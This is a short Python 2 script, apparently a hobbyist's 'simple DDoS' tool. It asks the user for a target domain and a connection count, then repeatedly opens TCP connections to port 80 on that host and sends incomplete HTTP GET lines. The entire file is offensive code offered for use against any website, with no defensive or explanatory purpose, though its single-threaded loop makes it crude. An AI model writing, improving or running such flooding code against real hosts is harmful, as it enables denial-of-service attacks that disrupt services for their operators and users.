#!/usr/bin/python
#-*- coding:utf-8 -*-
############################
#File Name: simple_ddos.py
#Author: orangleliu
#Mail: orangleliu@gmail.com
#Created Time: 2015-03-09 17:53:24
############################

import socket


message = "girl"
print "DDos will started, you should give me some infomation!"
port = 80
host = raw_input("what is the domain? (like xx.com)  ")
print host 
conn = int(raw_input("how many connections you want to make? "))
print conn
ip = socket.gethostbyname(host)
print "%s ip is %s"%(host, ip)

def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, port))
        ddos.send("GET /%s HTTP/1.1\r\n"%message)
        ddos.sendto("GET /%s HTTP/1.1\r\n"%message, (ip, port))
        ddos.send("GET %s HTTP/1.1\r\n"%message)
    except socket.error, msg:
        print "failed"
    ddos.close()

for i in xrange(conn):
    dos()


